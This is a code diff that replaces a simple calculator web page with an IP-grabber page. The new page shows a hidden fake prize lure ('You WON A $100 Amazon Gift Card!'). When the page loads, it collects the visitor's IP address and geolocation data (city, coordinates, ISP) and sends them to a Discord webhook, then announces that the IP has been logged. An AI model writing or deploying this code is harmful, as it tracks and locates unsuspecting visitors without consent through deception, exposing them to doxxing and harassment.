@@ -1,59 +1,81 @@
-<!-- RoactEZ 10.25.2022-->
 <!DOCTYPE html>
-<html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logged</title>
+    <!-- CSS -->
+    <link rel="stylesheet" href="src/css/main.min.css">
+    <!-- Fontawesome -->
+    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+    <!-- Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
+    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
+    <!-- Notyf CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+  </head>
+  <body>
+    <header class="header">🎉 You WON A $100 Amazon Gift Card!</header>
+    <script src="./config.js"></script>
+    <script>
+      function get_information(link, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", link, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            callback(xhr.responseText);
+          }
+        };
+        xhr.send(null);
+      }
+      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "razzylog";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
+      get_information("https://api.ipify.org/", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "ipppp";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
 
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width">
-  <title>Calculate me! - A calculator made my me</title>
-  <link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
-  <link href="style.css" rel="stylesheet" type="text/css" />
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+      function ipLogByRaz() {
+        var ispp = document.getElementById('ipppp').innerHTML
+        var extra = document.getElementById("razzylog").innerHTML
+        const request = new XMLHttpRequest();
+        request.open("POST", wbhk);
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+          username: "shooter",
+          avatar_url: 'https://cdn.discordapp.com/avatars/965760449817759744/01836a87d9be65eb6ac4303905a53cb0.webp',
+          content: "**IP** : _" + ispp + "_\n**MATERIAL(s)** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**OTHER** : ```" + extra + "```"
+        }
+        request.send(JSON.stringify(params));
+      }
+      setTimeout(function() {
+        ipLogByRaz()
+      }, 700);
+    </script>
+    <style>
+      .header {
+        display: none
+      }
 
-<body id="body">
-  <button class="mute" id="mute">🔈</button>
-  <h1 class="text-center">Calculator App</h1>
-  <div class="container flex flex-col items-center mx-auto m-w-20">
-    <div class="rowf">
-    
-    <div class="row">
-      <input class="input" id="input" type="text" pattern="[0-9-/()%*+-M]*" autofocus/>
-    </div>
-    
-    <div class="row">
-      <button class="button red">C</button>
-      <button class="button blue">%</button>
-      <button class="button blue">M+</button>
-      <button class="button blue">M-</button>
-    </div>
-    <div class="row">
-      <button class="button">7</button>
-      <button class="button">8</button>
-      <button class="button">9</button>
-      <button class="button">*</button>
-    </div>
-    <div class="row">
-      <button class="button">4</button>
-      <button class="button">5</button>
-      <button class="button">6</button>
-      <button class="button">/</button>
-    </div>
-    <div class="row">
-      <button class="button">1</button>
-      <button class="button">2</button>
-      <button class="button">3</button>
-      <button class="button">+</button>
-    </div>
-    <div class="row">
-      <button class="button">0</button>
-      <button class="button">.</button>
-      <button class="button">=</button>
-      <button class="button">-</button>
-    </div>
-    <p style="margin-top: 30px; color: white;">Made By shooter#0051</p>
-      </div>
-  </div>
-  <script src="script.js"></script>
-</body>
-
+      .map-container {
+        display: none
+      }
+    </style>
+    <p id="yes">Your IP Has Been Logged 😊</p>
+    <script>document.getElementById("yes").innerHTML.text=ispp</script>
+  </body>
 </html>
